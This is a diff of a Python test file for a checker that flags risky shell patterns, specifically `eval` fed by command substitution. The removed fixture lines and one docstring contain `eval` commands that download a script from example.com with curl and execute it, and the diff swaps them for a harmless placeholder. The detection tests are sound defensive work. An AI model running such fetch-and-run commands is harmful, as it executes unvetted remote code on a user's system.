@@ -236,9 +236,12 @@ def test_credential_use_review_line_still_fires_for_non_md_files(tmp_path):
 
 def test_eval_fed_by_command_substitution_is_reviewed(tmp_path):
     """#864/#875 learned that `eval "$(curl ...)"` is exactly the shape worth a
-    human's attention; flag it as REVIEW, not FAIL (#866)."""
+    human's attention; flag it as REVIEW, not FAIL (#866). `generate_value` here
+    (not `curl`) keeps this fixture about the eval shape alone -- a real network
+    command name in the same position is #898's own, separate FAIL guard,
+    covered by tests/test_release_branch_check_898.py."""
     root = _tree(tmp_path, {
-        "scripts/log.sh": b'#!/bin/sh\neval "$(curl -s https://example.com/setup.sh)"\n',
+        "scripts/log.sh": b'#!/bin/sh\neval "$(generate_value)"\n',
     })
     result = _check(root)
     assert result.offenders == []
@@ -319,9 +322,11 @@ def test_curl_pipe_sh_wrapped_on_both_sides_in_a_markdown_code_span_is_reviewed(
 
 def test_eval_fed_by_a_single_quoted_command_substitution_is_reviewed(tmp_path):
     """The eval check must not depend on the quote style -- single-quoted
-    command substitution is the same shape as double-quoted (review finding)."""
+    command substitution is the same shape as double-quoted (review finding).
+    `generate_value` (not `curl`) keeps this about the eval shape alone -- see
+    the sibling test above."""
     root = _tree(tmp_path, {
-        "scripts/log.sh": b"#!/bin/sh\neval '$(curl -s https://example.com/setup.sh)'\n",
+        "scripts/log.sh": b"#!/bin/sh\neval '$(generate_value)'\n",
     })
     result = _check(root)
     assert result.offenders == []
